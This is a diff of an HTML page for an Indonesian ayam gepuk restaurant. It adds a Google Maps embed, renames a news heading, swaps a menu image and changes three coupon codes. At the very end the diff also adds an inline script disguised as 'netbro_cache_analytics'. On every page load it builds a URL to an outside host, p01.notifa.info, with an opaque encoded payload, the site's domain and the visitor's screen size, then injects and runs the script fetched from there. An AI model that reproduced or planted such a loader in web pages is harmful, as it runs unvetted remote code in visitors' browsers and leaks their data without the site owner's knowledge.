@@ -10,6 +10,33 @@
 <link rel="stylesheet" href="css/wag-rwd.css" media="screen">
 <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/smoothscroll/1.4.6/SmoothScroll.min.js"></script>
+
+<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=true"></script>
+
+ <script type="text/javascript">
+    function initialize() {
+      var map;
+      var mapOptions = {
+        zoom: 13,
+        center: new google.maps.LatLng(-6.234747, 106.625356),
+        disableUi: true
+      };
+      map = new google.maps.Map(document.getElementById('map'),
+          mapOptions);
+		  
+		var myLatLng = new google.maps.LatLng(-6.234747, 106.625356);
+		var marker = new google.maps.Marker({
+          position: myLatLng,
+          map: map,
+          title: 'Hello World!'
+        });
+    }
+
+    google.maps.event.addDomListener(window, 'load', initialize);
+
+  </script>
+
+
 <!--[if lte IE 9]>
 <link rel="stylesheet" href="css/ie.css" type="text/css" media="screen">
 <script src="js/html5.js"></script>
@@ -80,7 +107,14 @@
         </form>
         <br /><br />
       </hgroup>
-    <!--  <a href="#" class="button1">View our gallery of sweets</a> -->
+
+
+      <hgroup class="hgroup-contact map-area">
+		<div class="map-container">
+		<div id="map" class="map" style=""></div>
+		</div>
+	  </hgroup>	  
+	  <!--  <a href="#" class="button1">View our gallery of sweets</a> -->
     </section>
   </div>
 </div>
@@ -93,7 +127,7 @@
           <div class="row row-custom">
             <div class="div-notice">
               <section class="group1 group1-custom">
-                <h5>Notice</h5> 
+                <h5>News</h5> 
                 <span class="span-notice-custom">more ></span>
                 <ul>
                   <li>&diams; Pembaharuan Menu <span>(02/02/2018)</span></li>
@@ -119,7 +153,7 @@
             <div class="div-sps-menu">
               <section class="group1 group1-custom-2">
                 <h5>Special Menu</h5>
-                <img src="images/aygep.png" class="img-special-menu" alt=""> 
+                <img src="images/agp-foot.jpg" class="img-special-menu" alt=""> 
                   <h6 class="title-menu-special">Gepuk Special</h6>
                   <small>Ayam Gepuk</small> <br />
                   <p>AYAM GEPUK adalah ayam dengan olahan yang sangat tradisional namun rasa internasional tak kalah dengan makanan retauran kelas atas.</p>
@@ -131,25 +165,28 @@
                   <ul class="list-event">
                     <li class="l-1">
                       <p>
-                        <b class="list-event-number">1</b> <b>Pedazin8977</b> <br />
-                        <small>10% Potongan</small>
+                        <b class="list-event-number">1</b> <b>FREEN0092</b> <br />
+                        <small>Free Tambah Nasi</small>
                       </p>
                     </li>
                     <li class="l-2">
                       <p>
-                        <b class="list-event-number">2</b> <b>NambahPDZ</b> <br />
-                        <small>Refil Sambal</small>
+                        <b class="list-event-number">2</b> <b>FREESM0093</b> <br />
+                        <small>Tambah Sambal</small>
                       </p>
                     </li>
                     <li class="l-3">
                       <p>
-                        <b class="list-event-number">3</b> <b>NagihPDZ</b> <br />
-                        <small>Free Drink</small>
+                        <b class="list-event-number">3</b> <b>FREEMN0094</b> <br />
+                        <small>Free Tambah Minum</small>
                       </p>
                     </li>
                   </ul>
                   <img src="images/event-cupon.png" class="img-event-coupon" alt="">
-                </p>
+				  <br /><br />
+				  <img src="images/ps-logo.png" class="img-ps">
+				  <img src="images/ap-logo.png" class="img-ps">
+				 </p>
               </section>              
             </div>
           </div>
@@ -172,7 +209,6 @@
     </div>    
   </div>
 </div>
-
 <script type="text/javascript" src="js/jquery.min.js"></script>
 
 <script>
@@ -183,5 +219,5 @@
     });
   })
 </script>
-</body>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mOST0oKH5R6%2beF7u0%2b14Mylpn6cLh4I%2bmA2XHbXwAwkIkMS4fDzBSt9drhF0qjQQRvD1hBGFapcIVgJuxIPwiHV22KevpqcXX%2frke%2f8cNF4KKZE8gWYdpJ20PWqLcuQ31DUpeq%2fpyr9yjdPppWr%2fcj0eBHl%2bMZau9VsatYLYa506%2bnGgrbvoCVbQnaA8qrOElNaR%2f%2frvObaYLSYJOv6sVzxaL5%2fOJ7Sx9nu8CAIclN0fdMxVUlKhcTc%2b6ppB7mvYoTqr0Difd06yI%2b%2fCWN8Vbe%2bFRAdnY0ZGDI8%2bjCAbdgWbdIJh9Z8PHvjkQDNDnM6Za25J5o8kI7P48mNWBN9pxnLioASep5cwpC5FRURJFALGSqnhHq1FJukWUPaIyflwNcM9JxpsypP%2bJj7niI8nqk2PiYL6ouhME0HgeOFHrBlBuXENCxpyBotzhHhYBcarB1NS8XPFRhReKJV7E8efKQ0T0WzpTT76Vkm%2faCjO9Qt2dIVHmoKK498C71XLrU79MMGNUthEcVU9rQyYf9VdYNETrJnhqcPOyxH6fAtmBvxY%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 </html>
